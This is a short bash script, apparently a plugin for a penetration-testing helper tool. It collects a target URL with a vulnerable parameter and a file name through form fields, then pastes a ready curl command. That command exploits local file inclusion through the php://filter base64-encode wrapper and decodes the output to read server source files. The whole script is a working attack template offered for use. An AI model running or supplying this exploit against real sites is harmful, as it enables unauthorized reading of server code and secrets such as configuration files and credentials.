#!/bin/bash

: '
LFI read files with php filter base64 encode
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
FILE_FIELD=$(form_item "file" "file" "index.php")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${FILE_FIELD}"

WEBSITE=${form_data["website"]}
FILE=${form_data["file"]}

paste_command "curl -ks '${WEBSITE}php://filter/read=convert.base64-encode/resource=${FILE}' | base64 -d"
